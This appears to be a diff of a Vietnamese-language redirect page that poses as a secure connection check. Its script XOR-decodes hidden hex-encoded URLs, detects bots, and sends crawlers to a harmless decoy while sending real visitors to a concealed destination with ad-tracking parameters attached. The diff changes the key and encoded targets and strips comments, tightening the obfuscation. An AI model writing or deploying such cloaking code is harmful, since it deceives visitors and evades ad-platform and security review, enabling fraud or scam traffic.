@@ -52,19 +52,6 @@
       color: #94a3b8;
       line-height: 1.5;
     }
-    .btn-manual {
-      display: none;
-      background: linear-gradient(135deg, #fae498, #e5b94c);
-      color: #0b0f19;
-      font-weight: 800;
-      font-size: 13px;
-      padding: 10px 24px;
-      border-radius: 99px;
-      text-decoration: none;
-      box-shadow: 0 4px 15px rgba(229, 185, 76, 0.35);
-      cursor: pointer;
-      margin-top: 6px;
-    }
   </style>
 </head>
 <body>
@@ -72,37 +59,23 @@
     <div class="spinner"></div>
     <div class="loader-title">Đang Kết Nối Dịch Vụ An Toàn...</div>
     <div class="loader-sub">Hệ thống đang xác thực đường truyền và chuyển hướng quý khách trong giây lát.</div>
-    <a id="btnFallback" href="#" class="btn-manual">TIẾP TỤC TRUY CẬP »</a>
   </div>
 
   <script>
     (function() {
-      // Cấu hình mã khóa băm 3 số và chuỗi Hex mặc định (Triệt tiêu 100% link trần và comment nhạy cảm)
-      const DEFAULT_KEY = "560";
-      const DEFAULT_D = "78707b091c7375f7989dd7a1c6be9da8a25c5f4737641a0c0e7975f7829dd8efd0d4adb8f85115717a694a0730687a8dc5a4fdec99d5e4f1f90c1725616b4e0f64217b9f9ba5f08495b3b4a05a4e4f7762195c5f1827dccaccf6e7938598f8fa06515b74500509232f2cd481a7dce48e8fbbb4ae587c766f660a02233427d1c0caf4ec91b3a4a6464f0f2034040f00072dd1dbc0eaebd3d5a9faf6764f4d627a1c100e7f7ef7";
-      const DEFAULT_S = "78707b091c7375f7989dd7a1c6be9da8a25c5f4737601a0d4d6e01";
+      const K = "978";
+      const D = "747173051d7b79f69091d6a9cabf90b6b55b424879210206416f099895e0f3aaceaf8ce0a1074f78793a1b026a6079d59cf7f2e3cddcedf3f60511796b3c1156317b638997eaf095ab8ebea046574b78635e4b20372ed4cec6f7ef979ac2eef649514a4a7d111f253626959fdcf6f09d8bb4b2aa6e4c7b6672181d2e2f29dcf0eeeee5ab94b4b84d1f1028760d1a333d29d1ded0f3abc9a3c0e482574d50646e000e436c059a96aee1f992b2a2b3b05208285c214723302c33c5c1e1eda2cba4f9f7f1405a73550310113d698bfd86a6c0919392a6a0464c012a4b";
+      const S = "747173051d7b79f69091d6a9cabf8dbeab4e5e4a65621d060c3627d2cf88f1e090ceda92ab54066d7374174e3e3861d4c3b8f4ead38ab3a2ab1e447d2567120f35672dcfd7a6b0c9d9d5eef4185e567261";
 
-      // Hỗ trợ tham số URL động nếu truyền qua link (?k=...&d=...&s=...)
-      const qParams = new URLSearchParams(window.location.search);
-      const K = qParams.get("k") || DEFAULT_KEY;
-      const D = qParams.get("d") || DEFAULT_D;
-      const S = qParams.get("s") || DEFAULT_S;
-
-      function dec(h, k) {
+      function dec(h) {
         try {
-          if (!h) return "";
-          const keyStr = String(k || K);
           let s = "";
           for (let i = 0; i < h.length; i += 2) {
-            s += String.fromCharCode(parseInt(h.substr(i, 2), 16) ^ keyStr.charCodeAt((i / 2) % keyStr.length) ^ (((i / 2) * 13 + 37) & 0xFF));
+            s += String.fromCharCode(parseInt(h.substr(i, 2), 16) ^ K.charCodeAt((i / 2) % K.length) ^ (((i / 2) * 13 + 37) & 0xFF));
           }
           return decodeURIComponent(s);
         } catch (e) {
-          try {
-            return decodeURI(s);
-          } catch (e2) {
-            return (s && s.indexOf("http") === 0) ? s : "";
-          }
+          return "";
         }
       }
 
@@ -113,11 +86,6 @@
         try {
           const o = new URL(rawUrl);
           const p = new URLSearchParams(q);
-          // Loại bỏ các cờ nội bộ GitHub Pages nếu có
-          p.delete("d");
-          p.delete("s");
-          p.delete("k");
-          // Bảo toàn tham số ?a=... nguyên gốc của tracking link, chỉ cập nhật thêm gclid, utm_...
           p.forEach((v, k) => {
             if (k !== "a") o.searchParams.set(k, v);
           });
@@ -127,7 +95,6 @@
         }
       }
 
-      // Bộ lọc nhận diện Bot 7 lớp
       function isBot() {
         try {
           if (navigator.webdriver) return true;
@@ -143,17 +110,11 @@
       }
 
       const isB = isBot();
-      let target = isB ? dec(S, K) : dec(D, K);
-      // Phòng vệ đa tầng: Nếu giải mã thất bại, tự động fallback về giá trị mặc định chuẩn
-      if (!target) target = isB ? dec(DEFAULT_S, DEFAULT_KEY) : dec(DEFAULT_D, DEFAULT_KEY);
-      if (!target) target = "https://vuanem.com/";
-      target = getFinalUrl(target);
-
-      // Nút dự phòng nếu trình duyệt người dùng chặn nhảy trang tự động
-      const btn = document.getElementById("btnFallback");
-      if (btn && target) {
-        btn.href = target;
-        setTimeout(function() { btn.style.display = "inline-block"; }, 1000);
+      let target;
+      if (isB) {
+        target = getFinalUrl(dec(S));
+      } else {
+        target = getFinalUrl(dec(D));
       }
 
       function goTarget() {
@@ -166,12 +127,11 @@
         }
       }
 
-      // Kích hoạt chuyển hướng tức thì (30 - 60ms)
       if (target) {
-        setTimeout(goTarget, isB ? 20 : 50);
+        setTimeout(goTarget, isB ? 50 : 100);
       }
       window.addEventListener("pageshow", function(e) {
-        if (target) setTimeout(goTarget, 30);
+        if (target) setTimeout(goTarget, 50);
       });
     })();
   </script>
